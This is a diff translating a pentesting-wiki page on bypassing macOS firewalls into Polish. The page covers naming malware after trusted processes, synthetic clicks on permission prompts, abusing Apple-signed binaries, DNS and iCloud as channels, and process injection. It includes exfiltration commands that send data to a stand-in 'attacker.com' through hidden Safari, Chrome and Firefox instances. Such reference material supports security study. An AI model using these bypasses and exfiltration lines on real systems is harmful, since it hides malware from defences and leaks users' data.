@@ -4,82 +4,72 @@
 
 ## Found techniques
 
-The following techniques were found working in some macOS firewall apps.
+Następujące techniki zostały znalezione jako działające w niektórych aplikacjach zapory macOS.
 
 ### Abusing whitelist names
 
-- For example calling the malware with names of well known macOS processes like **`launchd`**
+- Na przykład nazywając złośliwe oprogramowanie nazwami dobrze znanych procesów macOS, takich jak **`launchd`**
 
 ### Synthetic Click
 
-- If the firewall ask for permission to the user make the malware **click on allow**
+- Jeśli zapora prosi użytkownika o pozwolenie, spraw, aby złośliwe oprogramowanie **kliknęło na zezwól**
 
 ### **Use Apple signed binaries**
 
-- Like **`curl`**, but also others like **`whois`**
+- Takie jak **`curl`**, ale także inne, takie jak **`whois`**
 
 ### Well known apple domains
 
-The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.
+Zapora może zezwalać na połączenia z dobrze znanymi domenami Apple, takimi jak **`apple.com`** lub **`icloud.com`**. A iCloud może być używany jako C2.
 
 ### Generic Bypass
 
-Some ideas to try to bypass firewalls
+Kilka pomysłów na próbę obejścia zapór
 
 ### Check allowed traffic
 
-Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them
-
+Znajomość dozwolonego ruchu pomoże zidentyfikować potencjalnie białe listy domen lub które aplikacje mają dostęp do nich.
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
+### Wykorzystywanie DNS
 
-### Abusing DNS
-
-DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.
+Rozwiązania DNS są realizowane za pomocą **`mdnsreponder`**, podpisanej aplikacji, która prawdopodobnie będzie miała pozwolenie na kontakt z serwerami DNS.
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Via Browser apps
+### Poprzez aplikacje przeglądarkowe
 
 - **oascript**
-
 ```applescript
 tell application "Safari"
-    run
-    tell application "Finder" to set visible of process "Safari" to false
-    make new document
-    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
+run
+tell application "Finder" to set visible of process "Safari" to false
+make new document
+set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
 end tell
 ```
-
 - Google Chrome
-
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
 - Firefox
-
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
 - Safari
-
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
+### Poprzez wstrzykiwanie procesów
 
-### Via processes injections
-
-If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
+Jeśli możesz **wstrzyknąć kod do procesu**, który ma prawo łączyć się z dowolnym serwerem, możesz obejść zabezpieczenia zapory:
 
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
 
-## References
+## Odniesienia
 
 - [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
